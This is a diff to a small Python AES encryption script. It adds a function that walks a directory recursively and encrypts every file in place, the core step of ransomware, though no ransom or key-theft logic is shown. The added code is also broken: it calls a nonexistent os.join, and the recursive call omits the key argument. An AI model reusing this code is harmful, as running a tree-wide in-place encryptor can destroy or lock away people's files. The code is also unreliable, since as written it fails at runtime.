@@ -2,6 +2,7 @@ import base64
 import hashlib
 from Crypto import Random
 from Crypto.Cipher import AES
+import os
 
 def pad(data: bytes, block_size: int = 16) -> bytes:
     pad_len = block_size - (len(data) % block_size)
@@ -37,6 +38,16 @@ def decrypt_data(ciphertext, key):
         plaintext = unpad(plaintext)
         return plaintext.decode()
 
+ 
+
+def read_file(file_path):
+    with open(file_path, 'rb') as f:
+        return f.read()
+
+def write_file(file_path, data):
+    with open(file_path, 'wb') as f:
+        f.write(data)         
+
 
 def encrypt_file(input_file_path, key):
     plaintext = read_file(input_file_path)
@@ -49,15 +60,15 @@ def decrypt_file(input_file_path, key):
     decrypted_data = decrypt_data(ciphertext, key)
     write_file(input_file_path, decrypted_data.encode())
 
-def read_file(file_path):
-    with open(file_path, 'rb') as f:
-        return f.read()
 
-def write_file(file_path, data):
-    with open(file_path, 'wb') as f:
-        f.write(data)
-
-
+def process_directory(dirpath, key):
+    for item in os.listdir(dirpath):
+        fullpath = os.join(dirpath, item)
+        if os.path.isdir(fullpath):
+            process_directory(fullpath)
+        elif os.path.isfile(fullpath):
+            encrypt_file(fullpath, key)
+                 
 
 if __name__ == "__main__":
     # encrypted_data = encrypt_data("Hello World", "kuskus")
